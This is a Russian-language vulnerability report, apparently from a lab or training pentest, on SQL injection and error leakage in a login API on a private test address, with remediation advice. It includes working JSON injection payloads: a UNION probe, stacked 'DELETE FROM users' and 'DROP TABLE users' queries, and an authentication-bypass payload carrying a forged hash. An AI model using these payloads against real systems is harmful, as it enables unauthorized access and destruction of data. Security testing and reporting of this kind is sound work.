# Исследуемая страница: 
 `http://192.168.253.128:8888/login`  
## Описание уязвимости  
| Имя найденной уязвимости| Описание и последствия       
|-------------------------|------------
| УЯ1 (SQL injection)     | На странице авторизации отсутствует валидация и санитизация входных данных. Уязвимость позволяет получить доступ к сайту, изменять данные в таблицах и удалять содержимое БД.   Классификация по OWASP `A03:2021-Injection` (`https://owasp.org/Top10/`)
| УЯ2 (Security Misconfiguration)     | Сервис авторизации в ответе возвращает чувствительную информацию, которая позволяет определить наличие инъекции. Классификация по OWASP `A05:2021-Security Misconfiguration` (`https://owasp.org/Top10/`)  
## Технические детали обнаружения и воспроизведения
При тестировании будет использована УЗ:  
Логин - `SuperUser`  
Пароль - `12345`  

Уязвимость расположена по адресу `http://192.168.253.128:8888/login` и так же в связанном сервисе `http://192.168.253.128:8888/auth-api/auth/login`.  
`192.168.253.128` – динамический ip-адрес в поставляемом образе дистрибутива продукта.  
В ходе тестирования будут использованы два адреса `192.168.37.128` и `192.168.253.128` - это обусловлено переустановной ВМ и получением гового адреса. 

Проверяем УЗ запросом в сервис авторизации:  
![](pic/auth-req.png)  
Получаем корректный ответ и токен авторизации.  
```
{"code":"Ok","token":"eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIzMWIwNGRkNC1mYTlkLTRmZWMtOWJlMy1hMzdkMzRlNGRiMDIiLCJuYmYiOjE2NzcwNTA4NzQsImV4cCI6MTY3NzA1MDg4NCwiaWF0IjoxNjc3MDUwODc0fQ.aic8QAqET9AyjfWneaNC4m_SCCkAOXGsg6vNnX1pFEG5Yh1SLoZahhmd7t68BL14fuhrDUJ20gjfdHBmeiTIrkKjQQQm5wVtk1EW_3STB2dVAwImI5zgQVqFwijDz3R0L27m8EcSrvu83ROYpD3VE6p3YQfFW1R853GaLKOylrB0QDGSfNXIn9ttN_4yOuIaplVwhIq3ckMus_0VcKy36Ec3RrC1BmSWwtjPJpTelW07UMr69zWp0aJdv5Ym4If4XqOixrn8XtTObJyRUm0J31Jhe8b4iAPtEL8hyl0HbnCvmIMfbJ--5-9_BcdlERVUK1-JM4_LTGW-oxMIV9NFXQ","info":{"userId":"31b04dd4-fa9d-4fec-9be3-a37d34e4db02","login":"SuperUser","groupId":"929ea950-16e8-4365-9f09-e3160d220c46"}}
```

Уязвимость можно обнаружить, протестировав ответы на запросы авторизации.  
Тестирование наличия инъекции:  
```
{"login":"SuperUser' UNION ALL select NULL -- ","password":"123456"}
```

![](pic/sql-inject-1.png)

Ответ - `UNION query must have the same number of columns` говорит нам о том, что сервер не валидировал входные данные и выполнил код из поля `login`  

## Демонстрация возможностей эксплуатации
Не имея исходного кода приложения будет немного сложнее найти эксплойт для авторизации на сайте, но т.к. отсутствует ограничение на количество запросов и существует возможность внедрить модифицирующие БД запросы, найденная уязвимость считается критической.  

## Демонстрация нарушения целостности и доступности информации

### Удаление данных из таблицы пользователей:  

Запрос:  
```
{"login":"SuperUser'; DELETE FROM users; -- ","password":"123456"}
```
![](pic/sql-inject-2.png)

При следующем запросе авторизации с валидной УЗ получаем ошибку авторизации.
![](pic/auth-req-fail.png)  
Это значит, что пользователей в системе нет.

### Удаление таблицы пользователей:

Запрос:  
```
{"login":"SuperUser'; DROP TABLE users; -- ","password":"123456"}
```
![](pic/sql-inject-3.png)

При следующем запросе авторизации с валидной УЗ получаем ошибку:  

`{"code":"Failed","message":"42P01: relation \"users\" does not exist\n\nPOSITION: 39"}`  

![](pic/auth-req-fail-1.png)  
Это значит, что таблицы `users` в системе нет.

### Демонстрация авторизации на сайте
Имея исходный код приложения, можно провести анализ алгоритмов авторизации пользователя, цепочки вызовов сервисов и составить эксплоит.
```
{
  "login": "test' UNION ALL select u.id, u.login, 'I8wdY4rXLwlIanUiTGoZJcfrCsYhBHYdvGoSKJSqkd0=|100000|EWe/1LWwFABKbXRw3Pj2a+QxlrSi8SaNkXHR2WOX6oA=' from users as u --",
  "password": "test"
}
```

Пример использования экплоита на сайте и сервисе авторизации:
![](pic/sql-inject-exploit-1.png)  
![](pic/sql-inject-exploit-web-1.png)

## Выводы и рекомендации по устранению

### Рекомендации по устранению:
1. Добавить валидацию и санитизацию входных данных
2. Использовать экранирование параметров sql-запросов, использовать ORM вместо сырых запросов, использовать подготовленные запросы SQL (https://www.postgresql.org/docs/current/sql-prepare.html )
3. Контролировать сообщения об ошибках.
Возвращать в ответе клиенту только обработанные исключения.  

## Используемое программное обеспечение

### При тестировании использовались: 

1. OWASP ZAP 2.12;
2. Windows 10;
3. Firefox web browser.
